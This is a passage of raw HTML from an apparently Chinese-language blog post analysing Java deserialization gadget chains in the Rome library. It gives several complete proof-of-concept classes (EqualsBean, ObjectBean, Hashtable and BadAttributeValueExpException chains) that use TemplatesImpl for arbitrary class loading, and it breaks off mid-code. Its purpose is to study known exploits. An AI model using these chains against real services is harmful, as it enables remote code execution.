class="token operator">*</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">.</span><span class="token function">beanHashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和 cc 链相似的调用，最后是通过 TemplatesImpl 来实现任意类加载，开头是通过 hashmap 的 readObject 方法来完成调用</p><h2 id="ToStringBean-toString"><a href="#ToStringBean-toString" class="headerlink" title="ToStringBean.toString"></a>ToStringBean.toString</h2><p>直接看核心的 <code>ToStringBean.toString</code>，前面提过 rome 可以像 fastjson 那样任意调用 setter 和 getter，而 <code>ToStringBean.toString</code> 方法就是对 Java Bean 进行操作</p><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250217173421580.png" alt="image-20250217173421580"></p><p>先通过 <code>BeanIntrospector.getPropertyDescriptors(_beanClass)</code> 获取到 <code>_beanClass</code> 中的任意 getter 方法</p><p>在获取完任意 getter 方法后，做了一系列基本的判断 —— 确保 getter 方法不为空，确保能够调用类的 getter 方法，确保里面可以传参</p><p>判断结束后执行</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> value <span class="token operator">=</span> pReadMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>_obj<span class="token punctuation">,</span><span class="token constant">NO_PARAMS</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的 <code>pReadMethod.invoke()</code> 就类似于之前在反射中的 <code>method.invoke()</code> 一样</p><p>那么就和 fastjson 一样，<code>TemplatesImpl.getOutputProperties()</code> 明显是满足这个条件能被调用的方法</p><p>拿反射类比的话就像这样：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> _beanClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> _obj <span class="token operator">=</span> _beanClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Method</span> pReadMethod <span class="token operator">=</span> _beanClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getOutputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pReadMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>_obj<span class="token punctuation">,</span><span class="token constant">NO_PARAMS</span><span class="token punctuation">)</span><span class="token comment">// 等价于 TemplatesImpl.getOutputProperties()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>然后向上跟踪一下 invoke 的这两个参数</p><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250217174942283.png" alt="image-20250217174942283"></p><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250217175052238.png" alt="image-20250217175052238"></p><p>构造函数直接赋值这两个参数，一个是 Class 对象另一个是 Object 对象</p><p>因为<code>ToStringBean.toString(String)</code>方法是 private 方法，就可以看看哪里调用了 <code>toString(String)</code>，这里就在它的另外一个<code>toString</code> 方法里面</p><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250217180020890.png" alt="image-20250217180020890"></p><p>那么可以先构造这一步的poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ToStringBeanExec</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> tpl <span class="token operator">=</span> <span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> tpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        toStringBean<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250217175812595.png" alt="image-20250217175812595"></p><h2 id="调用-toString"><a href="#调用-toString" class="headerlink" title="调用 toString"></a>调用 toString</h2><p>接下来找调用 toString 的地方</p><p>这里是 EqualsBean#beanHashCode</p><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250217180259301.png" alt="image-20250217180259301"></p><p>那么调用就很明显了</p><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250217181027243.png" alt="image-20250217181027243"></p><p>equalsBean 和 toStringBean 是一样的写法</p><p>构造下一步的poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">EqualsBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EqualsBeanExec</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> tpl <span class="token operator">=</span> <span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> tpl<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">EqualsBean</span> equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        equalsBean<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250217181104137.png" alt="image-20250217181104137"></p><hr><h2 id="HashMap完整构造"><a href="#HashMap完整构造" class="headerlink" title="HashMap完整构造"></a>HashMap完整构造</h2><p>urldns链同款操作</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">EqualsBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EqualsBeanChain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> tpl <span class="token operator">=</span> <span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> tpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">EqualsBean</span> equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250217181442016.png" alt="image-20250217181442016"></p><hr><h1 id="ObjectBean链"><a href="#ObjectBean链" class="headerlink" title="ObjectBean链"></a>ObjectBean链</h1><p>用 <code>ObjectBean</code> 来替换 <code>EqualsBean</code>，代码基本不变，只变了这一句：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ObjectBean</span> objectBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>完整的poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ObjectBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ObjectBeanChain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> tpl <span class="token operator">=</span> <span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> tpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectBean</span> objectBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="HashTable链"><a href="#HashTable链" class="headerlink" title="HashTable链"></a>HashTable链</h1><p>这条链子实际上就是在 HashMap 被ban的情况下进行反序列化，因为最终目的始终都是调用 hashcode 函数，而 HashTbale 中刚好调用了 hashcode，因此仍然可以触发整套流程</p><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250217221633072.png" alt="image-20250217221633072"></p><p><img src="/blog/2025/02/17/Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250217221755393.png" alt="image-20250217221755393"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Hashtable</span> hashtable<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>完整的poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">EqualsBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HashTableChain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> tpl <span class="token operator">=</span> <span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> tpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">EqualsBean</span> equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hashtable</span> hashtable<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="BadAttributeValueExpException链"><a href="#BadAttributeValueExpException链" class="headerlink" title="BadAttributeValueExpException链"></a>BadAttributeValueExpException链</h1><p>此事在 cc5 中亦有记载，BadAttributeValueExpException 触发 toString，于是连上 ToStringBean</p><p>poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">EqualsBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BadAttributeValueExpExceptionChain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> tpl <span class="token operator">=</span> <span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">getTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> tpl<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span 